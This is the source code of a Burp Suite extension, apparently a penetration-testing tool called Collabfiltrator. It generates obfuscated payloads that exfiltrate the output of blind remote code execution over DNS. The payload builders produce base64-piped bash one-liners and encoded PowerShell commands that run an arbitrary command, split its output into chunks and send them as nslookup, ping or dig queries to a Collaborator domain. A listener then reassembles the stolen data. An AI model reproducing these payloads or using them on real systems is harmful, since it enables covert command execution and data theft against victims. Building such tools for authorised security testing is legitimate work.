'''
TODO
encrypt DNS exfil (PKI attacker holds private key, deploys public key to victim)
select several DNS exfil vectors (nslookup, dig, host, ping, wget, curl, python, perl, scp, sftp, ftp, ssh, telnet, rsh, nc, ruby)(certutil, wget, bitsadmin?, python, perl, ftp, sftp, smb, ruby, net use)

Ideas 4/3/2020 
'''

#Import Burp Objects
from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IBurpCollaboratorInteraction
#Import Java GUI Objects
from java.awt import Dimension, FlowLayout, Color, Toolkit
from java.awt.datatransfer import Clipboard, StringSelection
from javax import swing
from thread import start_new_thread
import sys, time, threading, base64, logging, dnslib, binascii, re, tempfile
try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass
    

logging.basicConfig(filename= tempfile.gettempdir() + '/burpCollabfiltrator.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:  %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
    # Extention information
    EXT_NAME = "Collabfiltrator"
    EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
    EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren"
    #global burpCollabInstance 
    #global domain
    # Output info to the Extensions console and register Burp API functions
    def registerExtenderCallbacks(self, callbacks):
        print "Name: \t\t"      + BurpExtender.EXT_NAME
        print "Description: \t" + BurpExtender.EXT_DESC
        print "Authors: \t"      + BurpExtender.EXT_AUTHOR
        # Required for easier debugging:
        # https://github.com/securityMB/burp-exceptions
        sys.stdout = callbacks.getStdout()
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName(BurpExtender.EXT_NAME)

        #Create Burp Collaborator Instance
        self.burpCollab  = self._callbacks.createBurpCollaboratorClientContext()
        self.collaboratorDomain = self.burpCollab.generatePayload(True)

        #Create panels used for layout; we must stack and layer to get the desired GUI
        self.tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane  = swing.JTabbedPane()
        self.tab.add(self.tabbedPane)
        
        # First tab
        self.collabfiltratorTab   = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane.addTab("Collabfiltrator", self.collabfiltratorTab)
        
        # Second tab
        #self.configurationTab = swing.Box(swing.BoxLayout.Y_AXIS)
        #self.tabbedPane.addTab("Configuration", self.configurationTab)
        
        # Create objects for the first tab's GUI
        # These rows will add top to bottom on the Y Axis
        self.t1r1 = swing.JPanel(FlowLayout())
        self.t1r2 = swing.JPanel(FlowLayout())
        self.t1r3 = swing.JPanel(FlowLayout())
        self.t1r4 = swing.JPanel(FlowLayout())
        self.t1r5 = swing.JPanel(FlowLayout())
        self.t1r6 = swing.JPanel(FlowLayout())
        self.t1r7 = swing.JPanel(FlowLayout())

        
        # Now add content to the first tab's GUI objects
        self.osComboBox = swing.JComboBox(["Windows", "Linux_ping", "Linux_nslookup", "Linux_dig"])
        #self.commandTxt = swing.JTextField("ls -lah", 35)
        self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 25)
        self.payloadTxt = swing.JTextArea(10,50)
        self.payloadTxt.setBackground(Color.lightGray)
        self.payloadTxt.setEditable(False)# So you can't messup the generated payload
        self.payloadTxt.setLineWrap(True) #Wordwrap the output of payload box
        self.outputTxt = swing.JTextArea(10,50)
        self.outputScroll = swing.JScrollPane(self.outputTxt) # Make the output scrollable

        self.progressBar = swing.JProgressBar(5,15)
        self.progressBar.setVisible(False) # Progressbar is hiding


        self.outputTxt.setBackground(Color.lightGray)
        self.outputTxt.setEditable(False)
        self.outputTxt.setLineWrap(True)
        self.burpCollaboratorDomainTxt = swing.JTextPane() # burp collaboratorTextPane
        self.burpCollaboratorDomainTxt.setText(" ") #burp collaborator domain goes here
        self.burpCollaboratorDomainTxt.setEditable(False)
        self.burpCollaboratorDomainTxt.setBackground(None)
        self.burpCollaboratorDomainTxt.setBorder(None)
        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>"))
        self.t1r2.add(swing.JLabel("Platform"))
        self.t1r2.add(self.osComboBox)
        self.t1r2.add(swing.JLabel("Command"))
        self.t1r2.add(self.commandTxt)
        self.t1r2.add(swing.JButton("Execute", actionPerformed=self.executePayload))
        self.t1r3.add(swing.JLabel("Payload"))
        self.t1r3.add(self.payloadTxt)
        self.t1r6.add(self.burpCollaboratorDomainTxt) #burp Collab Domain will go here
        self.t1r4.add(swing.JButton("Copy Payload to Clipboard", actionPerformed=self.copyToClipboard))
        self.t1r4.add(swing.JButton("Start poll results", actionPerformed=self.startPollResults))
        self.t1r4.add(swing.JButton("Stop listener", actionPerformed=self.stopPollResults))
        self.t1r4.add(swing.JButton("Show logs", actionPerformed=self.showLogs))
        self.t1r5.add(swing.JLabel("Output"))
        self.t1r5.add(self.outputScroll) #add output scroll bar to page
        self.t1r7.add(self.progressBar)
        
        # Add the GUI objects into the first tab
        self.collabfiltratorTab.add(self.t1r1)
        self.collabfiltratorTab.add(self.t1r2)
        self.collabfiltratorTab.add(self.t1r3)
        self.collabfiltratorTab.add(self.t1r6)
        self.collabfiltratorTab.add(self.t1r4)
        self.collabfiltratorTab.add(self.t1r7)
        self.collabfiltratorTab.add(self.t1r5)
        
        # Create objects for the second tab's GUI
        self.dummylabel = swing.JLabel("Burp Collaborator Config options will go here.")
        
        # Add the GUI objects into the second tab
        ########self.configurationTab.add(self.dummylabel)


        # Now that the GUI objects are added, we can resize them to fit snug in the UI
        self.t1r1.setMaximumSize(Dimension(800, 100))
        self.t1r2.setMaximumSize(Dimension(800, 50))
        self.t1r3.setMaximumSize(Dimension(800, 200))
        self.t1r4.setMaximumSize(Dimension(800, 200))
        self.t1r6.setMaximumSize(Dimension(800, 50))
        self.t1r7.setMaximumSize(Dimension(800, 50))

        #Register the panel in the Burp GUI
        callbacks.addSuiteTab(self)
        return

    # Standard function: Set the tab name
    def getTabCaption(self):
        return BurpExtender.EXT_NAME

    # Standard function: Set the GUI component in the tab
    def getUiComponent(self):
        return self.tab

    def createNslookupBashBase64Payload(self, linuxCommand):
        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g'); do nslookup `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
    
    def createPingBashBase64Payload(self, linuxCommand):
        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g    '); do ping -c 1 `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"

    def createDigBashBase64Payload(self, linuxCommand):
        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g        '); do dig `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"

    
    # Create windows powershell base64 payload
    def createPowershellBase64Payload(self, windowsCommand):
        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
        return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
    
    # return generated payload to payload text area
    def executePayload(self, event):
        self.collaboratorDomain = self.burpCollab.generatePayload(True)#rerun to regenrate new collab domain
        domain = self.collaboratorDomain # show domain in UI
        self.burpCollaboratorDomainTxt.setText(domain)

        logging.info("Generate CMD: {}".format(self.commandTxt.getText()))

        if self.osComboBox.getSelectedItem() == "Windows":
            self.payloadTxt.setText(self.createPowershellBase64Payload(self.commandTxt.getText()))
        elif self.osComboBox.getSelectedItem() == "Linux_nslookup":
            self.payloadTxt.setText(self.createNslookupBashBase64Payload(self.commandTxt.getText()))
        elif self.osComboBox.getSelectedItem() == "Linux_ping":
            self.payloadTxt.setText(self.createPingBashBase64Payload(self.commandTxt.getText()))
        elif self.osComboBox.getSelectedItem() == "Linux_dig":
            self.payloadTxt.setText(self.createDigBashBase64Payload(self.commandTxt.getText()))
        #self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
        return

    def checkCollabDomainStatusWrapper(self, domain, burpCollab):
        t = threading.Thread(target=self.checkCollabDomainStatus, args=(domain, burpCollab)) #comma has to be here even with only 1 arg because it expects a tuple
        t.start()
        return # thread doesn't stop locking in execute button

    #copy generated payload to clipboard
    def copyToClipboard(self, event):
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        data = StringSelection(self.payloadTxt.getText())
        clipboard.setContents(data, None)
        return    
    
    # start listen
    def startPollResults(self, event):
        self.checkCollabDomainStatusWrapper(self.collaboratorDomain, self.burpCollab)


    def stopPollResults(self, event):
        self.pollstop = True

    def showLogs(self, event):
        logfile = tempfile.gettempdir() + '/burpCollabfiltrator.log'
        content = "Logfile location: {} \n".format(logfile)
        content += "(last 20 lines): \n"
        with open(logfile) as f:
            content += "".join(f.readlines()[-20:]) ## default 20 lines

        self.outputTxt.append(content + "\n")
        

    #monitor collab domain for output response
    def checkCollabDomainStatus(self, domain, objCollab):
        self.outputTxt.setText("") ## clear the output
        DNSrecordDict = dict()#since data comes in out of order we have to line up each request with it's timestamp
        #recordType = "A" #01
        complete = False
        self.pollstop = False
        #recordType = "AAAA" #1C or int(28)
        #recordType = "MX" #00 ?
        sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.

        # Break the never ending loop
        loopCount = 0
        maxLoops = 60
        while (complete is False) and (loopCount <= maxLoops): #Only way I could figure out how to break out of this damn thing.
            self.progressBar.setVisible(True) #show progress bar
            self.progressBar.setIndeterminate(True) #make progress bar show listener is running
            check = objCollab.fetchCollaboratorInteractionsFor(domain)
            
            self.outputTxt.setText("Domains: " + domain + "\n")
            time.sleep(1)
            loopCount += 1
            oldkeys = DNSrecordDict.keys()

            for i in range(0, len(check)):
                try:
                    # we use dnslib to parse the result
                    packet = binascii.a2b_base64(check[i].getProperty('raw_query'))
                    dnsQuery = str(dnslib.DNSRecord.parse(packet).questions[0])
                    dnsQuery = dnsQuery.replace(';','').replace('IN      A','').replace(' ','')
                    #logging.info("raw: %s", dnsQuery)
                    #logging.info("allllll: {}".format(check[i].getProperties()))
                    
                    r = re.search("^\d\d\d\d\.", dnsQuery)
                    if r:
                        chunk = r.group().replace(".", '')
                        subdomain = re.findall(r"\S+?\.", dnsQuery)[1].replace(".",'')
                        DNSrecordDict[chunk] = subdomain
                        if subdomain.endswith('-E-F') == True: # ends when meet "-E-F", bugs maybe. 
                            complete = True
                    
                    #logging.info("record: {}".format(DNSrecordDict))
                except Exception as e:
                    logger.error('Failed: '+ str(e))
            
            ### Check if input stream is done.
            keys = DNSrecordDict.keys()
            if keys == oldkeys and keys != []:
                sameCounter += 1
            elif keys != oldkeys and keys != []:
                sameCounter = 0
                logging.info("record: {}".format(DNSrecordDict))
            if sameCounter == 30:
                complete = True
            if loopCount == 61:
                self.outputTxt.setText("Error: Listener Timeout." + "\n")
            if self.pollstop == True:
                break

        # End loop, clear the progress bar
        self.progressBar.setVisible(False) # hide progressbar
        self.progressBar.setIndeterminate(False) #turn off progressbar

        output = showOutput(DNSrecordDict)
        logging.info("output: %s", output)
        self.outputTxt.append(output + "\n") #print output to payload box
        self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
        #self.payloadTxt.setText("") #clear out payload box because listener has stopped     
        return


def showOutput(outputDict):
    completedInputString = ""
    for k,v in outputDict.items():
        if "E-F" in v:
            for chunk in (sorted(outputDict.items())): #Sort by preamble number to put data in order 
                completedInputString += chunk[1] # DNSrecordDict.items() returns a tuple so take value from the dict and append it to completedInputString.
    output = completedInputString[:-3].replace('-','=').replace('PLUS','+') # drop EOF marker and replace any - padding with = and fix PLUSes
    output = base64.b64decode(output)     
    return output



#Burp Error Debugging
'''
try:
    FixBurpExceptions()
except:
    pass
'''
